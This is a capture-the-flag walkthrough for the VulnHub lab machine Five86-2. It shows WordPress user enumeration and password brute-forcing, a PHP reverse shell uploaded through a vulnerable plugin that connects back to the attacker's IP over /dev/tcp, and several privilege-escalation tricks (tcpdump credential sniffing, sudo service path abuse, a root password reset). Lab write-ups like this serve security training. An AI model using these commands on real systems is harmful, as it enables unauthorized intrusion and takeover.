<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/vulnhub/" rel="category tag">VulnHub</a></span>            </div>
            <h1 class="post-title entry-title">Five86-2: Vulnhub Walkthrough</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/five86-2-vulnhub-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2020-01-22T17:25:59+00:00">January 22, 2020</time><time class="updated" datetime="2025-06-10T20:10:46+00:00">June 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">Today we are sharing another CTF walkthrough of the vulnhub machine named Five86-2 with the intent of gaining experience in the world of penetration testing. The credit goes to m0tl3ycr3w and syed umar for design this machine and the level is set to beginner to advanced.</span></p>
<p><span style="color: #000000;">According to the author: The ultimate goal of this challenge is to get root and to read the one and only flag.</span></p>
<p><span style="color: #000000;">Linux skills and familiarity with the Linux command line are a must, as is some experience with basic penetration testing tools.</span></p>
<p><span style="color: #000000;">Download it from here:<strong> https://www.vulnhub.com/entry/five86-2,418/</strong></span></p>
<h3><span style="color: #800000;"><strong>Penetration Testing Methodologies</strong></span></h3>
<p><span style="color: #000000;"><strong>Network scanning</strong></span></p>
<ul>
<li><span style="color: #000000;">Netdiscover</span></li>
<li><span style="color: #000000;">Nmap</span></li>
</ul>
<p><span style="color: #000000;"><strong>Enumeration</strong></span></p>
<ul>
<li><span style="color: #000000;">Exploring Http services</span></li>
<li><span style="color: #000000;">WordPress scanning (Wpscan)</span></li>
</ul>
<p><span style="color: #000000;"><strong>Exploit WordPress</strong></span></p>
<p><span style="color: #000000;"><strong>Privilege Escalation</strong></span></p>
<ul>
<li><span style="color: #000000;">Abusing capability</span></li>
<li><span style="color: #000000;">Abusing Sudo</span></li>
</ul>
<p><span style="color: #000000;"><strong><u>Walkthrough</u></strong></span></p>
<h3><span style="color: #800000;"><strong>Network Scanning</strong></span></h3>
<p><span style="color: #000000;">As you know, this is the initial phase where we choose <strong>netdiscover</strong> for network scan for identifying host IP and this we have <strong>192.168.0.114</strong> as our host IP.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-GA5Q4WM9s4I/XiiDCq_y7FI/AAAAAAAAiT4/FYxsJ4abAjkcM7VoehA29MyLhr0yEu0gQCLcBGAsYHQ/s1600/1.png"/></span></p>
<pre class="lang:default decode:true">nmap -A 192.168.0.114</pre>
<p><span style="color: #000000;">From its scanning, we found port 21 is open for FTP and port 80 is open HTTP where wordpress is running on apache.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-SLDFGaE9z20/XiiDFiVzJmI/AAAAAAAAiUU/KtGe8XkltIsARI-BlbQHsd1wP4Pqh5E8wCLcBGAsYHQ/s1600/2.png"/></span></p>
<h3><span style="color: #800000;"><strong>Enumeration</strong></span></h3>
<p><span style="color: #000000;">Thus, we navigate to a web browser and browse the following URL and found open wordpress application is running on the webserver.</span></p>
<pre class="lang:default decode:true">http://192.168.0.114</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-y46J0YWmzyQ/XiiDGDuwloI/AAAAAAAAiUc/t4TXZyunkW4zhsrbwFg6Mz9aOipuXjnZQCLcBGAsYHQ/s1600/3.png"/></span></p>
<p><span style="color: #000000;">Since we found the wordpress on the host machine thus we choose wpscan and run following commands for wordpress scanning.</span></p>
<pre class="lang:default decode:true"> wpscan --url http://192.168.0.114 --enumerate u</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-cFMPFHQ64IU/XiiDGqj_gQI/AAAAAAAAiUg/dj7iJW8J__8mexsDiD8DK7GrczjRykSKQCLcBGAsYHQ/s1600/4.png"/></span></p>
<p><span style="color: #000000;">From its scanning result, we enumerated 5 usernames: peter, admin, barney, gillian, Stephen as shown in the image below.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-QE0Se1sP08g/XiiDHP_PgPI/AAAAAAAAiUk/Y_0qVMcSQgQIsivBqUz3Il5tMkjlp6tGgCLcBGAsYHQ/s1600/5.png"/></span></p>
<p><span style="color: #000000;">We used rockyou.txt wordlist for password brute force attack to enumerate the password, so we saved above-mentioned username in a text file named user.txt and then launched brute force attack by executing the following command.</span></p>
<pre class="lang:default decode:true">wpscan --url http://192.168.0.114  -U user.txt -P /usr/share/wordlists/rockyou.txt</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-ZKYPapsR0J8/XiiDHS41MOI/AAAAAAAAiUo/pNI4apKJh1w7yT1tw2RV7iqV-H7JqNoiQCLcBGAsYHQ/s1600/6.png"/></span></p>
<p><span style="color: #000000;">From its scanning result, we found a password for barney and stephen as given below.</span></p>
<pre class="lang:default decode:true">Barney:spooky1
Stephen: apollol</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-rhh2yKATz3Q/XiiDHpvofcI/AAAAAAAAiUs/0RFeUd8jocsT6MxLsYT1AnWg--gC_8KCwCLcBGAsYHQ/s1600/7.png"/></span></p>
<p><span style="color: #000000;">To access the website properly we added the hostname and host IP within /etc/hosts file.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-U0aGbVcP7OM/XiiDIAkhLuI/AAAAAAAAiUw/7zHtCpQEsekd6jTl730dOANbbqOEIj78QCLcBGAsYHQ/s1600/8.png"/></span></p>
<p><span style="color: #000000;">Furthermore, using the Barney login credential we logged in to the wordpress and found a plugin “Insert or Embed Articulate Content into WordPress” was installed. We searched in the google to find out more about it and found a method on <strong><span style="color: #0000ff;"><a style="color: #0000ff;" href="https://www.exploit-db.com/exploits/46981">Exploit_DB</a> </span></strong>to exploit this plugin to obtain a reverse connection.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-z0-jWJlcu3o/XiiDIR39wDI/AAAAAAAAiU0/Ly3-YckuQ1My4HrBPCdovgIAxeG5ikPUgCLcBGAsYHQ/s1600/9.png"/></span></p>
<p><span style="color: #000000;">Exploiting WordPress         </span></p>
<p><span style="color: #000000;">For exploiting WordPress installed plug-in follow the step given below.</span></p>
<ol>
<li><span style="color: #000000;">Create a .zip archive with two files as: index.html, index.php</span></li>
</ol>
<pre class="lang:default decode:true">echo "&lt;html&gt;hello&lt;/html&gt;" &gt; index.html
echo "&lt;?php exec("/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/192.168.0.115/1234 0&gt;&amp;1'");" &gt; shell.php
zip raj.zip index.html shell.php</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-d7Hn_WL3Atk/XiiDCczAXXI/AAAAAAAAiT0/h1_L-8Tgoro_7xXbA3h5JcLB_mFiT1aqQCLcBGAsYHQ/s1600/10.png"/></span></p>
<ol start="2">
<li><span style="color: #000000;">login to wordpress as barney</span></li>
<li><span style="color: #000000;">Create a new Post -&gt; Select `Add block` -&gt; E-Learning -&gt;</span></li>
</ol>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/--aoPPvSVyJs/XiiDCQ3XyqI/AAAAAAAAiTw/L3WapXRfeE0I9BoZ4Q1jrouJlmnZ3HIhwCLcBGAsYHQ/s1600/11.png"/></span></p>
<ol start="2">
<li><span style="color: #000000;">Choose upload option for uploading your zip file.</span></li>
</ol>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-IjEAWouN6Rs/XiiDDk_fouI/AAAAAAAAiT8/VtrSrLtcuOUKOdc5CqniyE_u3YHsLlDJQCLcBGAsYHQ/s1600/12.png"/></span></p>
<ol start="3">
<li><span style="color: #000000;">Browse and Upload the raj.zip -&gt; Insert as: Iframe -&gt; Insert</span></li>
</ol>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-usVYLSZVhpw/XiiDD3_dBpI/AAAAAAAAiUA/t4bIJKqO1RwF7ZZvmwIEYUhWlaOCNbKiACLcBGAsYHQ/s1600/13.png"/></span></p>
<p><span style="color: #000000;">Start netcat listener on your local machine and access the webshell from the URL after uploading the zip file as shown:</span></p>
<pre class="lang:default decode:true">nc -lvp 1234
five86-2/wp-content/uploads/articulate_uploads/raj/shell.php</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-ht_sk_AFzrk/XiiDENjaF2I/AAAAAAAAiUE/M9vpSxwl9Jo7xS5EqcomhWNXd4YtBFuygCLcBGAsYHQ/s1600/14.png"/></span></p>
<p><span style="color: #000000;">Booom!! We got the reverse connection with the help of netcat session, but we know, this is a root to boot challenge hence we need to escalate the privilege try to gain access high privilege shell. So, we start post enumeration and find capability permission is given to Stephen for tcpdump.</span></p>
<pre class="lang:default decode:true">su stephen
apollo1
python3 -c 'import pty;pty.spawn("/bin/bash")'
getcap -r /2&gt;/dev/null</pre>
<p><span style="color: #000000;">So, we run the following command which reveals the UP &amp; running interfaces.</span></p>
<pre class="lang:default decode:true">tcpdump -D</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-3gW-XX4U4DQ/XiiDEmObwyI/AAAAAAAAiUI/cdPhoO80NUwXEwMqN5-_eYCl79VuuDwLgCLcBGAsYHQ/s1600/15.png"/></span></p>
<h3><span style="color: #800000;"><strong>Privi</strong><strong>lege Escalation</strong></span></h3>
<p><span style="color: #000000;">As we have seen in the above image that tcpdump has the capabilities to capture all network traffic even in low-privileged access, therefore I trigger the following command to inspect “<strong>veth1665bcd</strong>” traffic if possible, and save the output in a pcap file “cap.pcap”.</span></p>
<pre class="lang:default decode:true">timeout 150 tcpdump -w cap.pcap -i veth1665bcd</pre>
<p><span style="color: #000000;">With the help of of “-r” option we try to the pcap file and luckily found credentials</span></p>
<pre class="lang:default decode:true">Username: paul
Password: esomepasswford</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-9HR0ZxT0S_w/XiiDFMjQ7SI/AAAAAAAAiUQ/Qn5GR7wq6kQvwjdctN_LmQQeLihU5R-fgCLcBGAsYHQ/s1600/16.png"/></span></p>
<p><span style="color: #000000;">So with the help of above credential, we switch to paul account and check for sudo permission for him. We found paul has sudo permission to run /usr/sbin/service program as peter.</span></p>
<pre class="lang:default decode:true">sudo -l
sudo -u peter service ../../bin/sh</pre>
<p><span style="color: #000000;">With the help above command, we were able to access shell as peter.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-ZSOPXxbMUrg/XiiDE8p1wVI/AAAAAAAAiUM/K3mwqe92T9o0xHH8nOpSiG7DND7g83KxACLcBGAsYHQ/s1600/17.png"/></span></p>
<p><span style="color: #000000;">Then we check sudo right for peter and found he has ALL permission to run any program as root, but we don’t know Peter’s password and moreover peter owns sudo right for /usr/bin/passwd as root. In order to access root, we try to abuse the sudo permission by changing root’s password and try to get the final flag.</span></p>
<pre class="lang:default decode:true">sudo passwd root
new password: raj
su root
cd root
cat flag.txt</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-tZC1GfGlQgY/XiiDF6AUnuI/AAAAAAAAiUY/RxpKHPfRiKoEz1V0pcVeATWyZDBOxLiRwCLcBGAsYHQ/s1600/20.png"/></span></p>
<p><span style="color: #000000;"><strong>Author: </strong>Shubham Sharma is a Pentester, Cybersecurity Researcher and Enthusiast, contact <strong><u><a style="color: #000000;" href="https://www.linkedin.com/in/shubham-sharma-626964153/">here</a></u></strong>.</span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
